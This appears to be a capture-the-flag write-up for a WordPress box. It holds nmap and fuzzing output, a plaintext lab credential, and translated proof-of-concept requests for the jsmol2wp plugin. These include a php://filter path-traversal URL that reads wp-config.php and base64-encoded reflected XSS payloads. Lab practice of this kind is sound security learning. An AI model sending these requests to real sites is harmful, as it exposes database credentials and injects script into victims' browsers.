```nmap
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 6.7.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: AnotherCTF
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

creds:
```
wpuser:kbLSF2Vop#lw3rjDZ629*Z%G
```

did a wpscan and as given, we found a CVE for XSS and SSRF
CVE-2018-20463 and CVE-2018-20462

these were the quickhits
```
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 38ms]
.ht_wsr.txt             [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 38ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 38ms]
.htaccess-dev           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 39ms]
.htaccess-marco         [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 38ms]
.htaccess-local         [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 40ms]
.htaccess.BAK           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 40ms]
.htaccess.old           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 39ms]
.htaccess.bak1          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 39ms]
.htaccess.sample        [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 39ms]
.htaccess.txt           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 39ms]
.htaccess.bak           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 40ms]
.htaccess.orig          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 39ms]
.htaccess.save          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 39ms]
.htaccess_extra         [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 39ms]
.htaccess_sc            [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 38ms]
.htaccess_orig          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 38ms]
.htaccessBAK            [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 41ms]
.htpasswd_test          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 38ms]
.htpasswd-old           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 38ms]
.htgroup                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 39ms]
.htaccessOLD2           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 39ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 39ms]
.htaccessOLD            [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 40ms]
.htaccess~              [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 40ms]
.htpasswds              [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 39ms]
.htusers                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 39ms]
index.phps              [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 38ms]
license.txt             [Status: 200, Size: 19915, Words: 3331, Lines: 385, Duration: 40ms]
readme.html             [Status: 200, Size: 7409, Words: 750, Lines: 98, Duration: 39ms]
server-status/          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 39ms]
wp-content/plugins/akismet/akismet.php [Status: 200, Size: 69, Words: 15, Lines: 1, Duration: 39ms]
wp-content/uploads/     [Status: 200, Size: 1932, Words: 124, Lines: 22, Duration: 43ms]

```
this is the PoC file
```
ChatGPT translation of the page that doesn't render in archive.org:
 https://web.archive.org/web/20190915000000*/https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/

Version: 1.07
Link: https://wordpress.org/plugins/jsmol2wp/
A simple arbitrary file read and XSS vulnerability

Arbitrary file read & SSRF(CVE-2018-20463)
/wp-content/plugins/jsmol2wp/php/jsmol.php 137th line

The parameter $query of file_get_contents is directly controllable, so php://filter is used to read it. Of course, you can also use file:///etc/passwd to read the absolute path.

POC:

http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
?isform=true
&call=getRawDataFromDatabase
&query=php://filter/resource=../../../../wp-config.php

As you can see, this is also a simple SSRF.

Reflected XSS (CVE-2018-20462)
/wp-content/plugins/jsmol2wp/php/jsmol.php 157th line

Interestingly, the payload here can be encoded in BASE64, so it can bypass browser filtering.

POC:

http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
?isform=true
&call=saveFile
&data=<script>alert(/xss/)</script>
&mimetype=text/html; charset=utf-8

Using Base64:

http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
?isform=true
&call=saveFile
&data=PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=
&mimetype=text/html; charset=utf-8
&encoding=base64

The report describes two vulnerabilities in a WordPress plugin called "jsmol2wp". The first vulnerability is an arbitrary file read and server-side request forgery (SSRF) vulnerability (CVE-2018-20463) which can be exploited by controlling the $query parameter of file_get_contents in the jsmol.php file. The second vulnerability is a reflected cross-site scripting (XSS) vulnerability (CVE-2018-20462) which can be exploited by encoding the payload in BASE64. The report provides proof-of-concept (POC) examples for each vulnerability.

```

